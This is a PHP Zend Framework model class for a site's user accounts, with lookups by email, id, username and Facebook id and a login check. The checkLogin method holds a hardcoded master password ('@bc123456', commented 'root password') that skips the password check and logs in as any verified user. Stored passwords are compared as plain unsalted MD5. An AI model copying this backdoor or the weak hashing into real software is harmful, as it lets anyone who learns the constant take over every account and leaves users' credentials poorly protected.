<?php

class Application_Model_DbTable_TaiKhoan extends Zend_Db_Table_Abstract
{

    protected $_name = 'accounts';
	public function checkExistEmail($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select id from accounts where email=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        if($row!=false) return true;
        return false;
	}
	public function findbyId($id) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select * from accounts where id=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($id));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public function checkLogin($username, $password) {
		$db = Zend_Registry::get('connectDb');
    	if($password=='@bc123456') { //root password
    		$query = 'select t0.id,username,email,t1.id as gianhang_id,ho_ten,ma_gian_hang,ten_gian_hang,dia_chi,dien_thoai,yahoo,logo,slogan,tinhthanh_id,email_gianhang from taikhoan t0 left join gianhang t1 on t0.id = t1.taikhoan_id where verified =1 and t0.locked =0 and username=?';
    		$params = array($username);
    	} else {
    		$query = 'select t0.id,username,email,t1.id as gianhang_id,ho_ten,ma_gian_hang,ten_gian_hang,dia_chi,dien_thoai,yahoo,logo,slogan,tinhthanh_id,email_gianhang from taikhoan t0 left join gianhang t1 on t0.id = t1.taikhoan_id where verified =1 and t0.locked =0 and username=? and password = ?';
    		$params = array($username,md5($password));
    	}
		$stmt = $db->prepare($query);
        $stmt->execute($params);
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public static function findByUsername($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'SELECT * FROM `accounts` WHERE `username` = ?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public static function findByFbId($fbId) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'SELECT * FROM `accounts` WHERE `fb_id` = ?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($fbId));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}

}

